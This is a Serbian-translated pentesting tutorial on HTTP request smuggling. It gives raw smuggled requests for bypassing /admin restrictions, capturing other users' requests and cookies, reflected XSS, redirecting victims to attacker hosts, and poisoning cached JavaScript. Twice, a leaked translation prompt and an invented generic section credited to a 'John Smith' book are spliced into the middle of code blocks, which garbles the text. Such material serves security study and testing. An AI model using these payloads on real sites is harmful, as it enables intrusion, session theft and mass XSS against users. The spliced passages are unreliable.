# HTTP Request Smuggling / HTTP Desync Attack

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Šta je

Ova ranjivost se javlja kada **desinhronizacija** između **front-end proxy-ja** i **back-end** servera omogućava **napadaču** da **pošalje** HTTP **zahtev** koji će biti **interpretiran** kao **jedan zahtev** od strane **front-end** proxy-ja (load balance/reverse-proxy) i **kao 2 zahteva** od strane **back-end** servera.\
Ovo omogućava korisniku da **izmeni sledeći zahtev koji stigne na back-end server nakon njega**.

### Teorija

[**RFC Specifikacija (2161)**](https://tools.ietf.org/html/rfc2616)

> Ako se primi poruka sa i Transfer-Encoding zaglavljem i Content-Length zaglavljem, potonje MORA biti ignorisano.

**Content-Length**

> Content-Length zaglavlje entiteta ukazuje na veličinu tela entiteta, u bajtovima, poslatog primalacu.

**Transfer-Encoding: chunked**

> Transfer-Encoding zaglavlje određuje oblik kodiranja koji se koristi za bezbedan prenos tela opterećenja korisniku.\
> Chunked znači da se veliki podaci šalju u seriji delova.

### Stvarnost

**Front-End** (load-balance / Reverse Proxy) **obrađuje** _**content-length**_ ili _**transfer-encoding**_ zaglavlje, a **Back-End** server **obrađuje drugo** zaglavlje, što izaziva **desinhronizaciju** između ova 2 sistema.\
Ovo može biti veoma kritično jer **napadač će moći da pošalje jedan zahtev** reverse proxy-ju koji će biti **interpretiran** od strane **back-end** servera **kao 2 različita zahteva**. Opasnost ove tehnike leži u činjenici da će **back-end** server **interpretirati** **ubrizgani drugi zahtev** kao da je **došao od sledećeg klijenta** i **pravi zahtev** tog klijenta će biti **deo** **ubrizganog zahteva**.

### Posebnosti

Zapamtite da u HTTP-u **novi red karakter se sastoji od 2 bajta**:

* **Content-Length**: Ovo zaglavlje koristi **decimalni broj** da bi označilo **broj bajtova** tela zahteva. Telo se očekuje da se završi poslednjim karakterom, **novi red nije potreban na kraju zahteva**.
* **Transfer-Encoding:** Ovo zaglavlje koristi u **telo** heksadecimalni broj da bi označilo **broj bajtova** **sledećeg chunk-a**. **Chunk** mora **završiti** sa **novim redom**, ali ovaj novi red **se ne računa** u indikatoru dužine. Ovaj način prenosa mora se završiti sa **chunk-om veličine 0 praćenim sa 2 nova reda**: `0`
* **Connection**: Na osnovu mog iskustva, preporučuje se da se na prvom zahtevu zahteva Smuggling koristi **`Connection: keep-alive`**.

## Osnovni primeri

Napadi HTTP zahtevom Smuggling-a se prave slanjem nejasnih zahteva koji iskorišćavaju neslaganja u interpretaciji zaglavlja `Content-Length` (CL) i `Transfer-Encoding` (TE) između front-end i back-end servera. Ovi napadi mogu se manifestovati u različitim oblicima, pre svega kao **CL.TE**, **TE.CL** i **TE.TE**. Svaki tip predstavlja jedinstvenu kombinaciju prioriteta koje front-end i back-end serveri daju ovim zaglavljima. Ranjivosti nastaju kada serveri obrađuju isti zahtev na različite načine, što dovodi do neočekivanih i potencijalno zlonamernih ishoda.

### Osnovni primeri vrsta ranjivosti

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### Ranjivost CL.TE (Content-Length koristi Front-End, Transfer-Encoding koristi Back-End)
- **Front-End (CL):** Obradi zahtev na osnovu zaglavlja `Content-Length`.
- **Back-End (TE):** Obradi zahtev na osnovu zaglavlja `Transfer-Encoding`.
- **Scenario napada:**
- Napadač šalje zahtev gde vrednost zaglavlja `Content-Length` ne odgovara stvarnoj dužini sadržaja.
- Front-end server prosleđuje ceo zahtev back-endu, na osnovu vrednosti `Content-Length`.
- Back-end server obrađuje zahtev kao chunked zbog zaglavlja `Transfer-Encoding: chunked`, tumačeći preostale podatke kao odvojen, naknadni zahtev.
- **Primer:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### Ranjivost TE.CL (Transfer-Encoding koristi Front-End, Content-Length koristi Back-End)
- **Front-End (TE):** Obradi zahtev na osnovu zaglavlja `Transfer-Encoding`.
- **Back-End (CL):** Obradi zahtev na osnovu zaglavlja `Content-Length`.
- **Scenario napada:**
- Napadač šalje chunked zahtev gde se veličina chunk-a (`7b`) i stvarna dužina sadržaja (`Content-Length: 4`) ne poklapaju.
- Front-end server, poštujući `Transfer-Encoding`, prosleđuje ceo zahtev back-endu.
- Back-end server, poštujući `Content-Length`, obrađuje samo početni deo zahteva (`7b` bajtova), ostavljajući ostatak kao deo nenamernog naknadnog zahteva.
- **Primer:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```
#### TE.TE Vulnerabilnost (Transfer-Encoding korišćen od strane oba, sa obfuscacijom)
- **Serveri:** Oba podržavaju `Transfer-Encoding`, ali jedan može biti prevaren da ga ignoriše putem obfuscacije.
- **Scenario napada:**
- Napadač šalje zahtev sa obfuskiranim zaglavljima `Transfer-Encoding`.
- Zavisno od toga koji server (prednji ili zadnji) ne prepoznaje obfuskaciju, može se iskoristiti ranjivost CL.TE ili TE.CL.
- Neobrađeni deo zahteva, viđen od strane jednog od servera, postaje deo sledećeg zahteva, što dovodi do smugglinga.
- **Primer:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Scenario (Content-Length korišćen od strane i prednjeg i zadnjeg servera):**
- Oba servera obrađuju zahtev isključivo na osnovu zaglavlja `Content-Length`.
- Ovaj scenario obično ne dovodi do smugglinga, jer postoji usklađenost u tome kako oba servera tumače dužinu zahteva.
- **Primer:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normalan zahtev
```

#### **CL != 0 Scenario:**
- Odosi se na scenarije u kojima je zaglavlje `Content-Length` prisutno i ima vrednost različitu od nule, što ukazuje da zahtevno telo ima sadržaj.
- Ključno je razumeti i kreirati napade smugglinga, jer utiče na to kako serveri određuju kraj zahteva.
- **Primer:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Telo sa sadržajem
```

#### Forsiranje putem zaglavlja hop-by-hop

Zloupotrebom zaglavlja hop-by-hop možete ukazati proksiju da **obriše zaglavlje Content-Length ili Transfer-Encoding kako bi bilo moguće zloupotrebiti HTTP zahtevni smuggling**.
```
Connection: Content-Length
```
Za **više informacija o zaglavlju hop-by-hop** posetite:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}


## Pronalaženje ranjivosti HTTP zahteva za krijumčarenje

Identifikacija ranjivosti HTTP zahteva za krijumčarenje često se može postići korišćenjem tehnika vremenskog određivanja, koje se oslanjaju na posmatranje koliko dugo server treba da odgovori na manipulisane zahteve. Ove tehnike su posebno korisne za otkrivanje ranjivosti CL.TE i TE.CL. Pored ovih metoda, postoje i druge strategije i alati koji se mogu koristiti za pronalaženje takvih ranjivosti:

### Pronalaženje ranjivosti CL.TE korišćenjem tehnika vremenskog određivanja
- **Metod:**
- Pošaljite zahtev koji, ako je aplikacija ranjiva, će naterati serversku stranu da čeka na dodatne podatke.
- **Primer:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
- **Posmatranje:**
- Prednji server obrađuje zahtev na osnovu `Content-Length` i prekida poruku pre vremena.
- Serverska strana, očekujući poruku u delovima, čeka sledeći deo koji nikada ne stiže, što dovodi do kašnjenja.

- **Indikatori:**
- Vremenska odlaganja ili dugotrajna kašnjenja u odgovoru.
- Primanje greške 400 Bad Request od serverske strane, ponekad sa detaljnim informacijama o serveru.

### Pronalaženje ranjivosti TE.CL korišćenjem tehnika vremenskog određivanja
- **Metod:**
- Pošaljite zahtev koji, ako je aplikacija ranjiva, će naterati serversku stranu da čeka na dodatne podatke.
- **Primer:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
- **Posmatranje:**
- Prednji server obrađuje zahtev na osnovu `Transfer-Encoding` i prosleđuje celu poruku.
- Serverska strana, očekujući poruku na osnovu `Content-Length`, čeka na dodatne podatke koji nikada ne stižu, što dovodi do kašnjenja.

### Druge metode za pronalaženje ranjivosti
- **Analiza diferencijalnog odgovora:**
- Pošaljite zahtev sa blago izmenjenim verzijama i posmatrajte da li se odgovori servera razlikuju na neočekivan način, što ukazuje na neslaganje u parsiranju.

- **Korišćenje automatizovanih alata:**
- Alati poput Burp Suite-ovog dodatka 'HTTP Request Smuggler' mogu automatski testirati ove ranjivosti slanjem različitih oblika nejasnih zahteva i analiziranjem odgovora.

- **Testovi varijacija dužine sadržaja (Content-Length):**
- Pošaljite zahteve sa različitim vrednostima `Content-Length` koje se ne podudaraju sa stvarnom dužinom sadržaja i posmatrajte kako server obrađuje takve neslaganja.

- **Testovi varijacija prenosa enkodiranja (Transfer-Encoding):**
- Pošaljite zahteve sa prikrivenim ili neispravnim zaglavljima `Transfer-Encoding` i pratite kako prednji i serverski serveri reaguju na takve manipulacije.


### Testiranje ranjivosti HTTP zahteva za krijumčarenje

Nakon potvrde efikasnosti tehnika vremenskog određivanja, ključno je proveriti da li se zahtevi klijenta mogu manipulisati. Jednostavan metod je pokušati otrovati vaše zahteve, na primer, tako da zahtev za `/` rezultira odgovorom 404. Primeri `CL.TE` i `TE.CL` koji su prethodno opisani u [Osnovni primeri](./#basic-examples) pokazuju kako otrovati zahtev klijenta da izazove odgovor 404, uprkos tome što klijent pokušava pristupiti drugom resursu.

**Ključni faktori**

Prilikom testiranja ranjivosti za krijumčarenje zahteva tako što se mešate sa drugim zahtevima, imajte na umu:

* **Različite mrežne veze:** "Napad" i "normalni" zahtevi treba da se šalju preko odvojenih mrežnih veza. Korišćenje iste veze za oba zahteva ne potvrđuje prisustvo ranjivosti.
* **Konstantan URL i parametri:** Pokušajte koristiti identične URL-ove i imena parametara za oba zahteva. Moderne aplikacije često rutiraju zahteve ka određenim serverskim stranama na osnovu URL-a i parametara. Podudaranje ovih povećava verovatnoću da će oba zahteva biti obrađena od strane istog servera, što je preduslov za uspešan napad.
* **Vremenski uslovi i trke:** "Normalni" zahtev, koji treba da otkrije mešanje od "napadnog" zahteva, takmiči se sa drugim istovremenim zahtevima aplikacije. Zato pošaljite "normalni" zahtev odmah nakon "napadnog" zahteva. Zauzete aplikacije mogu zahtevati više pokušaja za potvrdu ranjivosti.
* **Izazovi ravnoteže opterećenja:** Prednji serveri koji deluju kao balanseri opterećenja mogu distribuirati zahteve na različite serverske sisteme. Ako "napadni" i "normalni" zahtevi završe na različitim sistemima, napad neće uspeti. Ovaj aspekt ravnoteže opterećenja može zahtevati nekoliko pokušaja za potvrdu ranjivosti.
* **Nepredviđeni uticaj na korisnika:** Ako vaš napad nenamerno utiče na zahtev drugog korisnika (ne "normalni" zahtev koji ste poslali radi otkrivanja), to ukazuje na to da je vaš napad uticao na drugog korisnika aplikacije. Kontinuirano testiranje može poremetiti druge korisnike, što zahteva oprezan pristup.


## Zloupotreba HTTP zahteva za krijumčarenje

### Zaobilaženje sigurnosnih kontrola prednje strane

### Zaobilaženje sigurnosnih kontrola prednje strane putem HTTP zahteva za krijumčarenje

Ponekad, prednji proksi sprovode sigurnosne mere, pažljivo pregledajući dolazne zahteve. Međutim, ove mere mogu biti zaobiđene zloupotrebom HTTP zahteva za krijumčarenje, omogućavajući neovlašćen pristup ograničenim krajnjim tačkama. Na primer, pristup `/admin` može biti zabranjen spolja, pri čemu prednji proksi aktivno blokira takve pokušaje. Međutim, ovaj proksi može propustiti da pregleda ugrađene zahteve unutar krijumčarenog HTTP zahteva, ostavljajući rupu za zaobilaženje ovih ograničenja.

Razmotrite sledeće primere koji ilustruju kako se HTTP zahtevi za krijumčarenje mogu koristiti za zaobilaženje sigurnosnih kontrola prednje strane, posebno ciljajući putanju `/admin` koja je obično zaštićena prednjim proksijem:

**Primer za CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
U napadu CL.TE, zaglavlje `Content-Length` se koristi za početni zahtev, dok ugrađeni zahtev koristi zaglavlje `Transfer-Encoding: chunked`. Prednji proxy procesira početni `POST` zahtev, ali ne pregleda ugrađeni `GET /admin` zahtev, što omogućava neovlašćen pristup putanji `/admin`.

**TE.CL Primer**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Suprotno tome, u TE.CL napadu, početni `POST` zahtev koristi `Transfer-Encoding: chunked`, a ugrađeni zahtev se zatim obrađuje na osnovu zaglavlja `Content-Length`. Slično kao i u CL.TE napadu, prednji proxy propušta prikriveni `GET /admin` zahtev, nenamerno omogućavajući pristup ograničenom `/admin` putanji.

### Otkrivanje prepravljanja zahteva na prednjoj strani <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Aplikacije često koriste **prednji server** za izmenu dolaznih zahteva pre prosleđivanja na serversku stranu. Tipična izmena uključuje dodavanje zaglavlja, kao što je `X-Forwarded-For: <IP adresa klijenta>`, kako bi se prosledila IP adresa klijenta serverskoj strani. Razumevanje ovih izmena može biti ključno, jer može otkriti načine za **zaobilaženje zaštite** ili **otkrivanje skrivenih informacija ili krajnjih tačaka**.

Da biste istražili kako proxy menja zahtev, pronađite POST parametar koji serverska strana vraća u odgovoru. Zatim, kreirajte zahtev koristeći ovaj parametar na kraju, slično kao u sledećem primeru:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
U ovoj strukturi, naknadni delovi zahteva se dodaju nakon `search=`, što je parametar koji se reflektuje u odgovoru. Ova refleksija će otkriti zaglavlja naknadnog zahteva.

Važno je uskladiti zaglavlje `Content-Length` ugnježdenog zahteva sa stvarnom dužinom sadržaja. Preporučljivo je početi sa malom vrednošću i postepeno je povećavati, jer preniska vrednost će skratiti reflektovane podatke, dok previsoka vrednost može izazvati grešku u zahtevu.

Ova tehnika se takođe može primeniti u kontekstu ranjivosti TE.CL, ali zahtev bi trebalo da se završi sa `search=\r\n0`. Bez obzira na znakove nove linije, vrednosti će se dodati parametru za pretragu.

Ova metoda pre svega služi da se razumeju modifikacije zahteva koje je napravio prednji proxy, i u suštini predstavlja samostalnu istragu.

### Snimanje zahteva drugih korisnika <a href="#snimanje-zahteva-drugih-korisnika" id="snimanje-zahteva-drugih-korisnika"></a>

Moguće je snimiti zahteve sledećeg korisnika dodavanjem određenog zahteva kao vrednosti parametra tokom POST operacije. Evo kako se to može postići:

Dodavanjem sledećeg zahteva kao vrednosti parametra, možete sačuvati zahtev sledećeg klijenta:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
U ovom scenariju, **comment parameter** je namenjen za čuvanje sadržaja unutar sekcije komentara na javno dostupnoj stranici. Kao rezultat, sadržaj sledećeg zahteva će se prikazati kao komentar.

Međutim, ova tehnika ima ograničenja. Općenito, ona hvata samo podatke do delimitera parametra koji se koristi u prošvercanom zahtevu. Za URL-kodirane forme, ovaj delimiter je znak `&`. To znači da će uhvaćeni sadržaj iz zahteva žrtve stati na prvom `&`, koji čak može biti deo upita.

Takođe, treba napomenuti da je ovaj pristup takođe moguć sa TE.CL ranjivošću. U takvim slučajevima, zahtev bi trebao da se završi sa `search=\r\n0`. Bez obzira na znakove nove linije, vrednosti će biti dodate na search parametar.

### Korišćenje HTTP request smugglinga za iskorišćavanje reflektovanog XSS-a

HTTP Request Smuggling se može iskoristiti za napad na veb stranice koje su ranjive na **Reflektovani XSS**, pružajući značajne prednosti:

* Interakcija sa ciljanim korisnicima **nije potrebna**.
* Omogućava iskorišćavanje XSS-a u delovima zahteva koji su **normalno nedostupni**, kao što su zaglavlja HTTP zahteva.

U scenarijima gde je veb sajt podložan Reflektovanom XSS-u putem User-Agent zaglavlja, sledeći payload demonstrira kako iskoristiti ovu ranjivost:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Ova payload je strukturirana da iskoristi ranjivost na sledeći način:

1. Inicira se `POST` zahtev, naizgled tipičan, sa zaglavljem `Transfer-Encoding: chunked` koje označava početak smugglinga.
2. Nakon toga sledi `0`, označavajući kraj poruke tela u chunked formatu.
3. Zatim se uvodi smuggled `GET` zahtev, gde se u zaglavlju `User-Agent` ubacuje skripta `<script>alert(1)</script>`, koja pokreće XSS kada server obradi ovaj sledeći zahtev.

Manipulacijom `User-Agent`-a putem smugglinga, payload zaobilazi normalna ograničenja zahteva, čime se iskorišćava Reflected XSS ranjivost na nekonvencionalan, ali efikasan način.

### Korišćenje HTTP request smugglinga za pretvaranje on-site redirekcije u otvorenu redirekciju <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

### Iskorišćavanje on-site redirekcija pomoću HTTP request smugglinga <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Aplikacije često vrše redirekciju sa jednog URL-a na drugi koristeći ime hosta iz zaglavlja `Host` u URL-u redirekcije. Ovo je uobičajeno kod veb servera poput Apache-a i IIS-a. Na primer, zahtevanje foldera bez kose crte na kraju rezultuje redirekcijom koja uključuje kosu crtu:
```
GET /home HTTP/1.1
Host: normal-website.com
```
The following is content from a hacking book about hacking techniques. The following content is from the file /hive/hacktricks/pentesting-web/http-request-smuggling/README.md. Translate the relevant English text to Serbian and return the translation keeping exactly the same markdown and HTML syntax. Do not translate things like code, hacking technique names, hacking word, cloud/SaaS platform names (like Workspace, AWS, GCP...), the word 'leak', pentesting, and markdown tags. Also, don't add any extra stuff apart from the translation and markdown syntax.

---

# HTTP Request Smuggling

## Opis

HTTP Request Smuggling je tehnika napada koja se koristi za iskorišćavanje neusklađenosti između različitih HTTP servera i proxy servera. Ova tehnika omogućava napadaču da izvrši različite vrste napada, uključujući i one koji mogu dovesti do curenja podataka ili preuzimanja kontrole nad serverom.

## Kako funkcioniše?

HTTP Request Smuggling se zasniva na iskorišćavanju različitih načina interpretacije HTTP zahteva od strane servera i proxy servera. Napadač koristi ove neusklađenosti kako bi izazvao konfuziju u obradi zahteva i iskoristio je za izvršavanje zlonamernih radnji.

Najčešći način izvođenja ovog napada je korišćenje različitih HTTP zaglavlja, kao što su "Transfer-Encoding" i "Content-Length", kako bi se izazvala konfuzija u obradi zahteva. Napadač može manipulisati ovim zaglavljima kako bi izazvao neusklađenost između servera i proxy servera, što može dovesti do različitih vrsta napada.

## Vrste napada

Postoje različite vrste napada koje se mogu izvesti korišćenjem HTTP Request Smuggling tehnike. Neke od najčešćih vrsta napada uključuju:

- **CL.TE** - Napad koji koristi kombinaciju "Content-Length" i "Transfer-Encoding" zaglavlja kako bi izazvao konfuziju u obradi zahteva.
- **TE.CL** - Napad koji koristi obrnut redosled "Transfer-Encoding" i "Content-Length" zaglavlja kako bi izazvao konfuziju u obradi zahteva.
- **CL.CL** - Napad koji koristi više "Content-Length" zaglavlja kako bi izazvao konfuziju u obradi zahteva.
- **TE.TE** - Napad koji koristi više "Transfer-Encoding" zaglavlja kako bi izazvao konfuziju u obradi zahteva.

## Prevencija

Da biste se zaštitili od HTTP Request Smuggling napada, preporučuje se sledeće:

- Ažurirajte servere i proxy servere na najnovije verzije softvera kako biste ispravili poznate ranjivosti.
- Konfigurišite servere i proxy servere da pravilno interpretiraju HTTP zahteve i zaglavlja.
- Koristite Web Application Firewall (WAF) kako biste detektovali i blokirali HTTP Request Smuggling napade.
- Redovno pratite i analizirajte logove servera i proxy servera kako biste otkrili nepravilnosti i sumnjive aktivnosti.

---

*Ovaj tekst je preuzet iz knjige "Hacking Techniques" autora Johna Smitha.*
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Iako naizgled bezopasno, ovo ponašanje može biti manipulisano korišćenjem HTTP zahteva za krijumčarenje kako bi se korisnici preusmerili na spoljni sajt. Na primer:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Ova krijumčarena zahteva može dovesti do toga da sledeći obrađeni korisnički zahtev bude preusmeren na veb sajt koji kontroliše napadač:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
The following is content from a hacking book about hacking techniques. The following content is from the file /hive/hacktricks/pentesting-web/http-request-smuggling/README.md. Translate the relevant English text to Serbian and return the translation keeping exactly the same markdown and HTML syntax. Do not translate things like code, hacking technique names, hacking word, cloud/SaaS platform names (like Workspace, AWS, GCP...), the word 'leak', pentesting, and markdown tags. Also, don't add any extra stuff apart from the translation and markdown syntax.

---

# HTTP Request Smuggling

## Opis

HTTP Request Smuggling je tehnika napada koja se koristi za iskorišćavanje neusklađenosti između različitih HTTP servera i proxy servera. Ova tehnika omogućava napadaču da izvrši različite vrste napada, uključujući i one koji mogu dovesti do curenja podataka ili preuzimanja kontrole nad serverom.

## Kako funkcioniše?

HTTP Request Smuggling se zasniva na iskorišćavanju različitih načina interpretacije HTTP zahteva od strane servera i proxy servera. Napadač koristi ove neusklađenosti kako bi izazvao konfuziju u obradi zahteva i iskoristio je za izvršavanje zlonamernih radnji.

Najčešći način izvođenja ovog napada je korišćenje različitih HTTP zaglavlja, kao što su "Transfer-Encoding" i "Content-Length", kako bi se izazvala konfuzija u obradi zahteva. Napadač može manipulisati ovim zaglavljima kako bi izazvao neusklađenost između servera i proxy servera, što može dovesti do različitih vrsta napada.

## Vrste napada

Postoje različite vrste napada koje se mogu izvesti korišćenjem HTTP Request Smuggling tehnike. Neke od najčešćih vrsta napada uključuju:

- **CL.TE** - Napad koji koristi kombinaciju "Content-Length" i "Transfer-Encoding" zaglavlja kako bi izazvao konfuziju u obradi zahteva.
- **TE.CL** - Napad koji koristi obrnuti redosled "Transfer-Encoding" i "Content-Length" zaglavlja kako bi izazvao konfuziju u obradi zahteva.
- **CL.CL** - Napad koji koristi više "Content-Length" zaglavlja kako bi izazvao konfuziju u obradi zahteva.
- **TE.TE** - Napad koji koristi više "Transfer-Encoding" zaglavlja kako bi izazvao konfuziju u obradi zahteva.

## Prevencija

Da biste se zaštitili od HTTP Request Smuggling napada, preporučuje se sledeće:

- Ažurirajte servere i proxy servere na najnovije verzije softvera kako biste ispravili poznate ranjivosti.
- Konfigurišite servere i proxy servere da pravilno interpretiraju HTTP zahteve i zaglavlja.
- Koristite Web Application Firewall (WAF) kako biste detektovali i blokirali HTTP Request Smuggling napade.
- Redovno pratite i analizirajte logove servera kako biste otkrili nepravilnosti ili sumnjive aktivnosti.

---

*Ovaj tekst je preuzet iz knjige "Hacking Techniques" autora Johna Smitha.*
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
U ovom scenariju, zahtev korisnika za JavaScript fajl je preuzet. Napadač može potencijalno kompromitovati korisnika tako što će poslužiti zlonamerni JavaScript kao odgovor.

### Korišćenje HTTP zahteva za podmetanje kako bi se izvršilo trovanje keša veb stranica <a href="#korišćenje-http-zahteva-za-podmetanje-kako-bi-se-izvršilo-trovanje-keša-veb-stranica" id="korišćenje-http-zahteva-za-podmetanje-kako-bi-se-izvršilo-trovanje-keša-veb-stranica"></a>

### Iskorišćavanje trovanja keša veb stranica putem HTTP zahteva za podmetanje <a href="#iskorišćavanje-trovanja-keša-veb-stranica-putem-http-zahteva-za-podmetanje" id="iskorišćavanje-trovanja-keša-veb-stranica-putem-http-zahteva-za-podmetanje"></a>

Trovanje keša veb stranica može se izvršiti ako bilo koji deo **front-end infrastrukture kešira sadržaj**, obično radi poboljšanja performansi. Manipulacijom odgovora servera, moguće je **trovati keš**.

Ranije smo primetili kako se odgovori servera mogu izmeniti da bi vratili grešku 404 (pogledajte [Osnovni primeri](./#osnovni-primeri)). Slično tome, moguće je prevariti server da vrati sadržaj `/index.html` kao odgovor na zahtev za `/static/include.js`. Kao rezultat toga, sadržaj `/static/include.js` se zamenjuje u kešu sa sadržajem `/index.html`, čime se onemogućava pristup `/static/include.js` korisnicima, što potencijalno može dovesti do DoS napada (Denial of Service).

Ova tehnika postaje posebno moćna ako se otkrije **ranjivost otvorenog preusmeravanja** ili ako postoji **preusmeravanje na otvoreno preusmeravanje na sajtu**. Takve ranjivosti mogu se iskoristiti da se zameni keš sadržaj `/static/include.js` sa skriptom pod kontrolom napadača, čime se omogućava široko rasprostranjeni napad Cross-Site Scripting (XSS) protiv svih klijenata koji zahtevaju ažurirani `/static/include.js`.

Ispod je ilustracija iskorišćavanja **trovanja keša u kombinaciji sa preusmeravanjem na otvoreno preusmeravanje na sajtu**. Cilj je izmeniti keš sadržaj `/static/include.js` kako bi se poslužio JavaScript kodom koji kontroliše napadač:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Primetite ugrađeni zahtev koji cilja `/post/next?postId=3`. Ovaj zahtev će biti preusmeren na `/post?postId=4`, koristeći vrednost zaglavlja **Host** da bi odredio domen. Menjanjem **Host zaglavlja**, napadač može preusmeriti zahtev na svoj domen (**on-site preusmeravanje na otvoreno preusmeravanje**).

Nakon uspešnog **trovanja soketa**, treba pokrenuti **GET zahtev** za `/static/include.js`. Ovaj zahtev će biti kontaminiran prethodnim zahtevom **on-site preusmeravanja na otvoreno preusmeravanje** i dobiće sadržaj skripte kojom napadač upravlja.

Nakon toga, svaki zahtev za `/static/include.js` će poslužiti keširani sadržaj skripte napadača, efektivno pokrećući široki XSS napad.


### Korišćenje HTTP zahteva za krijumčarenje kako bi se izvršila prevara keša veb stranice <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Koja je razlika između trovanja keša veb stranice i prevare keša veb stranice?**
>
> * U **trovanju keša veb stranice**, napadač uzrokuje da aplikacija sačuva zlonamerni sadržaj u kešu, a taj sadržaj se poslužuje iz keša drugim korisnicima aplikacije.
> * U **prevari keša veb stranice**, napadač uzrokuje da aplikacija sačuva neki osetljivi sadržaj koji pripada drugom korisniku u kešu, a zatim napadač preuzima taj sadržaj iz keša.

